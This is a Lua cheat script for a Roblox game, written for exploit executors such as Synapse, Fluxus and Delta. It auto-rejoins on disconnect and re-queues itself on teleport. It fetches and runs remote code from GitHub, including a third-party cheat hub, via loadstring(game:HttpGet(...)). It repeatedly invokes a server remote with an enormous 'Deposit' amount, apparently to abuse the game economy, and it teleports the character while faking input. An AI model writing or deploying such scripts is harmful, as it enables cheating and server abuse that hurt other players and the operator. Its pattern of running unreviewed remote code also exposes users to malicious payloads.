repeat wait() until game:IsLoaded()
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local vu = game:GetService("VirtualInputManager")
local VirtualInputManager = game:GetService('VirtualInputManager')
print("Roblox loaded")
print("v0.1")
game.NetworkClient.ChildRemoved:Connect(function()
	if game.PlaceId == 76455837887178 then
		game:GetService("TeleportService"):Teleport(76455837887178)
	end
end)
		
		queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) or (delta and delta.queue_on_teleport)
		local TeleportCheck = false
		game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
		if (not TeleportCheck) and queueteleport then
			TeleportCheck = true
			queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/AyoItsHanee/main/main/dikit.lua'))()")
		end
		end)
local function clickMenuFrame()
    -- 2. Wait for "MenuFrame" to become visible and keep clicking until it disappears
    local menuFramePath = player:WaitForChild("PlayerGui")
        :WaitForChild("Start")
        :WaitForChild("MenuFrame")
	local core = player:WaitForChild("PlayerGui")
	:WaitForChild("Main")
	:WaitForChild("Core")
    
    --repeat task.wait() until menuFramePath.Visible
    wait(15)
    print("MenuFrame is visible, clicking until it disappears...")
        vu:SendMouseButtonEvent(0, 0, 0, true, game, 1)
        task.wait(0.1)
        vu:SendMouseButtonEvent(0, 0, 0, false, game, 1)
end
spawn(function()
	while task.wait(1) do
	local args = {
    [1] = {
        ["Command"] = "Deposit",
        ["Amount"] = 10000000000000000000
    }
}

game:GetService("ReplicatedStorage").Source.Network.RemoteFunctions.Ronks:InvokeServer(unpack(args))
	end

end)
clickMenuFrame()
print("MenuFrame is no longer visible, proceeding...")
loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/refs/heads/main/FrostByte/Initiate.lua"))()
--loadstring(game:HttpGet('https://raw.githubusercontent.com/x2Kotaro/Venuz-hub/main/Loader.lua'))()
task.wait(5)
humanoidRootPart.CFrame = CFrame.new(1974, -408, 1526)
wait(3)
VirtualInputManager:SendKeyEvent(true, "One", false, game)
wait(0.1) -- Simulate key press duration
VirtualInputManager:SendKeyEvent(false, "One", false, game)
--humanoidRootPart.CFrame = CFrame.new(704, 6, 457)
